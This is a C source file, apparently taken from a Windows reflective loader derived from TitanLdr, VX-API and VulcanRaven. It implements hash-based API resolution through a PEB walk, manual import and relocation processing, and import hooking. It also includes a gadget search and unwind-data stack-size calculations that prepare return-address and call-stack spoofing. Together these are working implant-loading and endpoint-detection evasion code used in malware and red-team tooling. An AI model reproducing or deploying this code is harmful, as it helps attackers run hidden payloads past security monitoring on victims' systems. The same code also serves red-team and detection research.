//
// https://github.com/SecIdiot/TitanLdr
// https://github.com/vxunderground/VX-API
//

#include "include.h"

typedef struct
{
    WORD    Offset  : 0xc;
    WORD    Type    : 0x4;
} IMAGE_RELOC, *PIMAGE_RELOC ;

typedef struct
{
    D_API( LdrGetProcedureAddress );
    D_API( LdrLoadDll );
    D_API( RtlAnsiStringToUnicodeString );
    D_API( RtlFreeUnicodeString );
    D_API( RtlInitAnsiString );
    

} API;

SECTION( E ) UINT32 HashString( PVOID buffer, ULONG size ) 
{
    UCHAR       Cur = 0;
    ULONG       Djb = 0;
    PUCHAR      Ptr = NULL;

    Djb = 5380;
    Ptr = C_PTR( buffer );
    Djb++;
    
    while ( TRUE )
    {
        Cur = * Ptr;

        if( ! size )
        {
            if( ! * Ptr )
            {
                break;
            };
        } else
        {
            if( ( ULONG )( Ptr - ( PUCHAR )buffer ) >= size )
            {
                break;
            };
            if( ! * Ptr )
            {
                ++Ptr; continue;
            };
        };

        if( Cur >= 'a' )
        {
            Cur -= 0x20;
        };

        Djb = ( ( Djb << 5 ) + Djb ) + Cur; ++Ptr;
    };
    return Djb;
};

SECTION( E ) PVOID FindModule( ULONG hash, PPEB peb, PULONG size )
{
    PLIST_ENTRY             Hdr = NULL;
    PLIST_ENTRY             Ent = NULL;
    PLDR_DATA_TABLE_ENTRY   Ldr = NULL;

    // If no peb ptr supplied, just grab our own
    if ( peb == NULL)
    {
        peb = NtCurrentTeb()->ProcessEnvironmentBlock;
    }

    Hdr = & peb->Ldr->InLoadOrderModuleList;
    Ent = Hdr->Flink;

    for( ; Hdr != Ent; Ent = Ent->Flink )
    {
        Ldr = C_PTR( Ent );
        if( HashString( Ldr->BaseDllName.Buffer, Ldr->BaseDllName.Length ) == hash )
        {
            if( size != NULL )
            {
                *size = Ldr->SizeOfImage;
            };

            return Ldr->DllBase;
        };
    };
    
    return NULL;
};

SECTION( E ) VOID LdrProcessIat( PVOID image, PVOID directory )
{
    API                 Api;
    PPEB                Peb;
    ANSI_STRING         Ani;
    UNICODE_STRING      Unm;
    HANDLE              hNtdll;

    PVOID                       Mod = NULL;
    PVOID                       Fcn = NULL;
    PIMAGE_THUNK_DATA           Otd = NULL;
    PIMAGE_THUNK_DATA           Ntd = NULL;
    PIMAGE_IMPORT_BY_NAME       Ibn = NULL;
    PIMAGE_IMPORT_DESCRIPTOR    Imp = NULL;


    RtlSecureZeroMemory( &Api, sizeof( Api ) );
    RtlSecureZeroMemory( &Ani, sizeof( Ani ) );
    RtlSecureZeroMemory( &Unm, sizeof( Unm ) );

    Peb = NtCurrentTeb()->ProcessEnvironmentBlock;
    hNtdll = FindModule( H_LIB_NTDLL, Peb, NULL );

    Api.RtlAnsiStringToUnicodeString = FindFunction( hNtdll, H_API_RTLANSISTRINGTOUNICODESTRING );
    Api.LdrGetProcedureAddress       = FindFunction( hNtdll, H_API_LDRGETPROCEDUREADDRESS );
    Api.RtlFreeUnicodeString         = FindFunction( hNtdll, H_API_RTLFREEUNICODESTRING );
    Api.RtlInitAnsiString            = FindFunction( hNtdll, H_API_RTLINITANSISTRING );
    Api.LdrLoadDll                   = FindFunction( hNtdll, H_API_LDRLOADDLL );

    for( Imp = C_PTR( directory ) ; Imp->Name != 0 ; ++Imp ) {
        Api.RtlInitAnsiString( &Ani, C_PTR( U_PTR( image ) + Imp->Name ) );

        if( NT_SUCCESS( Api.RtlAnsiStringToUnicodeString( &Unm, &Ani, TRUE ) ) ) {
            if( NT_SUCCESS( Api.LdrLoadDll( NULL, 0, &Unm, &Mod ) ) ) {
                Otd = C_PTR( U_PTR( image ) + Imp->OriginalFirstThunk );
                Ntd = C_PTR( U_PTR( image ) + Imp->FirstThunk );

                for( ; Otd->u1.AddressOfData != 0 ; ++Otd, ++Ntd ) {
                    if( IMAGE_SNAP_BY_ORDINAL( Otd->u1.Ordinal ) ) {
                        if( NT_SUCCESS( Api.LdrGetProcedureAddress( Mod, NULL, IMAGE_ORDINAL( Otd->u1.Ordinal ), &Fcn ) ) ) {
                            Ntd->u1.Function = ( ULONGLONG )Fcn;
                        };
                    } else {
                        Ibn = C_PTR( U_PTR( image ) + Otd->u1.AddressOfData );
                        Api.RtlInitAnsiString( &Ani, C_PTR( Ibn->Name ) );

                        if( NT_SUCCESS( Api.LdrGetProcedureAddress( Mod, &Ani, 0, &Fcn ) ) ) {
                            Ntd->u1.Function = ( ULONGLONG )Fcn;
                        };
                    };
                };
            };
            Api.RtlFreeUnicodeString( &Unm );
        };
    };
};

SECTION( E ) VOID LdrProcessRel( PVOID image, PVOID directory, PVOID imageBase )
{
    ULONG_PTR                   Ofs = 0;
    PIMAGE_RELOC                Rel = NULL;
    PIMAGE_BASE_RELOCATION      Ibr = NULL;

    Ibr = ( PIMAGE_BASE_RELOCATION )( directory );
    Ofs = U_PTR( U_PTR( image ) - U_PTR( imageBase ) );

    while ( Ibr->VirtualAddress != 0 ) {
        Rel = ( PIMAGE_RELOC )( Ibr + 1 );

        while ( C_PTR( Rel ) != C_PTR( U_PTR( Ibr ) + Ibr->SizeOfBlock ) )
        {
            switch( Rel->Type ) {
                case IMAGE_REL_BASED_DIR64:
                    *( DWORD64 * )( U_PTR( image ) + Ibr->VirtualAddress + Rel->Offset ) += ( DWORD64 )( Ofs );
                    break;
                case IMAGE_REL_BASED_HIGHLOW:
                    *( DWORD32 * )( U_PTR( image ) + Ibr->VirtualAddress + Rel->Offset ) += ( DWORD32 )( Ofs );
                    break;
            };
            ++Rel;
        };
        Ibr = C_PTR( Rel );
    };
};

SECTION( E ) VOID LdrHookImport( PVOID image, PVOID directory, ULONG hash, PVOID function ) 
{
    ULONG                       Djb = 0;
    PIMAGE_THUNK_DATA           Otd = NULL;
    PIMAGE_THUNK_DATA           Ntd = NULL;
    PIMAGE_IMPORT_BY_NAME       Ibn = NULL;
    PIMAGE_IMPORT_DESCRIPTOR    Imp = NULL;

    for( Imp = C_PTR( directory ) ; Imp->Name != 0 ; ++Imp )
    {
        Otd = C_PTR( U_PTR( image ) + Imp->OriginalFirstThunk );
        Ntd = C_PTR( U_PTR( image ) + Imp->FirstThunk );

        for( ; Otd->u1.AddressOfData != 0 ; ++Otd, ++Ntd )
        {
            if( ! IMAGE_SNAP_BY_ORDINAL( Otd->u1.Ordinal ) )
            {
                Ibn = C_PTR( U_PTR( image ) + Otd->u1.AddressOfData );
                Djb = HashString( Ibn->Name, 0 );

                if( Djb == hash )
                {
                    Ntd->u1.Function = ( ULONGLONG )C_PTR( function );
                };
            };
        };
    };
};

SECTION( E ) PVOID FindFunction( PVOID image, ULONG hash ) 
{
    ULONG                       Idx = 0;
    PUINT16                     Aoo = NULL;
    PUINT32                     Aof = NULL;
    PUINT32                     Aon = NULL;
    PIMAGE_DOS_HEADER           Hdr = NULL;
    PIMAGE_NT_HEADERS           Nth = NULL;
    PIMAGE_DATA_DIRECTORY       Dir = NULL;
    PIMAGE_EXPORT_DIRECTORY     Exp = NULL;

    Hdr = C_PTR( image );
    Nth = C_PTR( U_PTR( Hdr ) + Hdr->e_lfanew );
    Dir = & Nth->OptionalHeader.DataDirectory[ IMAGE_DIRECTORY_ENTRY_EXPORT ];

    if( Dir->VirtualAddress )
    {
        Exp = C_PTR( U_PTR( Hdr ) + Dir->VirtualAddress );
        Aon = C_PTR( U_PTR( Hdr ) + Exp->AddressOfNames );
        Aof = C_PTR( U_PTR( Hdr ) + Exp->AddressOfFunctions );
        Aoo = C_PTR( U_PTR( Hdr ) + Exp->AddressOfNameOrdinals );

        for( Idx = 0 ; Idx < Exp->NumberOfNames ; ++Idx )
        {
            if( HashString( C_PTR( U_PTR( Hdr ) + Aon[ Idx ] ), 0 ) == hash )
            {
                return C_PTR( U_PTR( Hdr ) + Aof[ Aoo[ Idx ] ] );
            };
        };
    };
    return NULL;
};

SECTION( E ) INT compare( PVOID stringA, PVOID stringB, SIZE_T length )
{
    PUCHAR A = stringA;
    PUCHAR B = stringB;

    do {
        if( *A++ != *B++ )
        {
            return( *--A - *--B );
        };
    } while( --length != 0 );

    return 0;
};

SECTION( E ) PVOID FindGadget( LPBYTE module, ULONG size )
{
	for( int x = 0; x < size; x++ )
	{
		if( compare( module + x, "\xFF\x23", 2 ) == 0 )
		{
            return ( LPVOID )( module + x );
		};
	};

    return NULL;
};

SECTION( E ) PRUNTIME_FUNCTION GetRuntimeFunction( PVOID Address, PDWORD64 ImageBase )
{
    // Walk the PEB Modules, try to find the module that function falls within
    PLIST_ENTRY pModule      = ( ( PPEB ) NtCurrentTeb()->ProcessEnvironmentBlock )->Ldr->InLoadOrderModuleList.Flink;
	PLIST_ENTRY pFirstModule = pModule;
	do
	{

        // Get Size of DLL;
        PVOID                 Base          = NULL;
        PIMAGE_NT_HEADERS     NtHeaders     = NULL;
        PIMAGE_SECTION_HEADER SecHeader     = NULL;
        DWORD                 TextSize      = NULL;
        PVOID                 LowerBound    = NULL;
        PVOID                 UpperBound    = NULL;
        
        Base            = (( PLDR_DATA_TABLE_ENTRY ) pModule )->DllBase;
        if ( Base )
        {
            if ( *( PWORD )( Base ) == 0x5A4D )
            {
                
                NtHeaders		= (PVOID) ( Base + ( ( PIMAGE_DOS_HEADER ) Base )->e_lfanew );
                
                if ( *( PWORD )NtHeaders == 0x4550 )
                {
                    if ( NtHeaders->FileHeader.Characteristics & 0x2000 )
                    {

                        SecHeader 		= IMAGE_FIRST_SECTION( NtHeaders );

                        for ( int i = 0; i < NtHeaders->FileHeader.NumberOfSections; i++ )
                        {
                            if ( HashString( SecHeader[ i ].Name, 0 ) ==  H_SECTION_PDATA )
                            {
                                LowerBound      = (PBYTE) Base + SecHeader[ i ].VirtualAddress;
                                UpperBound      = (PBYTE) LowerBound + SecHeader[ i ].Misc.VirtualSize;
                            }
                        }

                        if ( LowerBound && UpperBound )
                        {
                            // Let's find the PRUNTIME_FUNCTION in the pdata
                            PVOID RelativeAddress  =  Address - Base;

                            for ( PRUNTIME_FUNCTION p = LowerBound; p < UpperBound ; p++ )
                            {
                                if ( RelativeAddress >= p->BeginAddress && RelativeAddress <= p->EndAddress )
                                {
                                    *ImageBase = Base;
                                    return p;
                                }
                            }
                        }
                    }
                }
            }
        }
        pModule =  pModule->Flink;
	
    } while ( pModule && pModule != pFirstModule );

    return NULL;
}

/* Credit to VulcanRaven project for the original implementation of these two*/
SECTION( E ) ULONG CalculateFunctionStackSize( PRUNTIME_FUNCTION pRuntimeFunction, DWORD64 ImageBase )
{
    #define RBP_OP_INFO 0x5
    #define true 1

    NTSTATUS status = STATUS_SUCCESS;
    PUNWIND_INFO pUnwindInfo = NULL;
    ULONG unwindOperation = 0;
    ULONG operationInfo = 0;
    ULONG index = 0;
    ULONG frameOffset = 0;
    StackFrame stackFrame = { 0 };

    if (!pRuntimeFunction)
    {
        status = STATUS_INVALID_PARAMETER;
        goto Cleanup;
    }

    pUnwindInfo = (PUNWIND_INFO)(pRuntimeFunction->UnwindData + ImageBase);
    while (index < pUnwindInfo->CountOfCodes)
    {
        unwindOperation = pUnwindInfo->UnwindCode[index].UnwindOp;
        operationInfo = pUnwindInfo->UnwindCode[index].OpInfo;
        switch (unwindOperation) {
        case UWOP_PUSH_NONVOL:
            stackFrame.totalStackSize += 8;
            if (RBP_OP_INFO == operationInfo)
            {
                stackFrame.pushRbp = true;
                stackFrame.countOfCodes = pUnwindInfo->CountOfCodes;
                stackFrame.pushRbpIndex = index + 1;
            }
            break;
        case UWOP_SAVE_NONVOL:
            index += 1;
            break;
        case UWOP_ALLOC_SMALL:
            stackFrame.totalStackSize += ((operationInfo * 8) + 8);
            break;
        case UWOP_ALLOC_LARGE:
            index += 1;
            frameOffset = pUnwindInfo->UnwindCode[index].FrameOffset;
            if (operationInfo == 0)
            {
                frameOffset *= 8;
            }
            else
            {
                index += 1;
                frameOffset += (pUnwindInfo->UnwindCode[index].FrameOffset << 16);
            }
            stackFrame.totalStackSize += frameOffset;
            break;
        case UWOP_SET_FPREG:
            stackFrame.setsFramePointer = true;
            break;
        default:
            status = STATUS_ASSERTION_FAILURE;
            break;
        }

        index += 1;
    }

    if (0 != (pUnwindInfo->Flags & UNW_FLAG_CHAININFO))
    {
        index = pUnwindInfo->CountOfCodes;
        if (0 != (index & 1))
        {
            index += 1;
        }
        pRuntimeFunction = (PRUNTIME_FUNCTION)(&pUnwindInfo->UnwindCode[index]);
        return CalculateFunctionStackSize(pRuntimeFunction, ImageBase);
    }

    stackFrame.totalStackSize += 8;

    return stackFrame.totalStackSize;
	Cleanup:
		return status;
}

SECTION( E ) ULONG CalculateFunctionStackSizeWrapper( PVOID ReturnAddress )
{
    NTSTATUS status = STATUS_SUCCESS;
    PRUNTIME_FUNCTION pRuntimeFunction = NULL;
    DWORD64 ImageBase = 0;
    PUNWIND_HISTORY_TABLE pHistoryTable = NULL;
    if (!ReturnAddress)
    {
        status = STATUS_INVALID_PARAMETER;
        goto Cleanup;
    }

    pRuntimeFunction = GetRuntimeFunction( ReturnAddress, &ImageBase );
    if (NULL == pRuntimeFunction)
    {
        status = STATUS_ASSERTION_FAILURE;
        goto Cleanup;
    }
    
    ULONG StackSize = CalculateFunctionStackSize( pRuntimeFunction, ImageBase );
    return StackSize;

	Cleanup:
		return status;
}

SECTION( E ) VOID PrepSpoof( PPRM Param, PVOID Module, DWORD Size )
{
	Param->trampoline 		= FindGadget( Module, Size );
	Param->Gadget_ss		= CalculateFunctionStackSizeWrapper( Param->trampoline );

	Param->RUTS_retaddr 	= ( PBYTE ) FindFunction( FindModule( H_LIB_NTDLL, NULL, NULL ), H_API_RTLUSERTHREADSTART ) + 0x21 ;
	Param->RUTS_ss			= CalculateFunctionStackSizeWrapper( Param->RUTS_retaddr );

	Param->BTIT_retaddr		= ( PBYTE ) FindFunction( FindModule( H_LIB_KERNEL32, NULL, NULL ), H_API_BASETHREADINITTHUNK ) + 0x14 ; 
	Param->BTIT_ss			= CalculateFunctionStackSizeWrapper( Param->BTIT_retaddr );

	Param->Fixup			= OFFSET( Fixup );
	return;
} 